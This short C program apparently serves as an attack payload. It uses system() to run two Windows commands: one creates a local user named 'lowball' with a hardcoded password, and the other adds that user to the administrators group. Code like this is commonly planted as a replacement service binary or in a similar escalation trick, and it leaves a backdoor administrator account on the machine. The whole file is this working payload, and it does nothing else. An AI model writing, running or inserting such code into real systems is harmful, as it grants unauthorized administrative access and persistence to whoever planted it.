#include <stdlib.h>
/* system, NULL, EXIT_FAILURE */
int main ()
{
    // create the user
    int h;
    h=system ("net user lowball fdas43 /ADD");

    // add to the administrators group
    int i;
    i=system ("net localgroup administrators lowball /add");
    return 0;
}
